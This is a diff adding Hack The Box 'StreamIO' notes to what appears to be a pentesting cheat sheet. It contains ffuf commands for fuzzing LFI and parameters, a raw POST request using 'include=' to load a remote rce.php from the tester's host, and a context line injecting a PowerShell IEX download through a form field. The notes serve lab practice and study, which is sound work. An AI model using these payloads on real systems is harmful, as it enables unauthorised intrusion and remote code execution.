@@ -158,3 +158,40 @@ curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).Dow
 ```
 
 
+### Notes from HTB StreamIO for LFI
+
+```
+If you see this, maybe you can LFI: **?user=**
+
+Fuzz it:
+ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://streamio.htb/admin/index.php?message=FUZZ -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1678
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u https://streamio.htb/admin/index.php?FUZZ= -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1678
+
+ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u https://streamio.htb/admin/index.php?debug=FUZZ -b PHPSESSID=8ldbs678ajgeum49okb767249a -fs 1712
+
+
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u https://streamio.htb/admin/FUZZ.php -b PHPSESSID=8ldbs678ajgeum49okb767249a
+
+
+
+Also worth noting here, once we figured out we could do LFI via the include command, I used burp to repeat, changed from GET to POST, and added the include line at the end, but still needed to also manually add the Content:type line:
+
+POST /admin/index.php?debug=master.php HTTP/2
+Host: streamio.htb
+Cookie: PHPSESSID=9acr1fp7e2rjcfnhgat8l8hnfs
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Te: trailers
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 34
+
+include=http://10.10.14.76/rce.php
+```
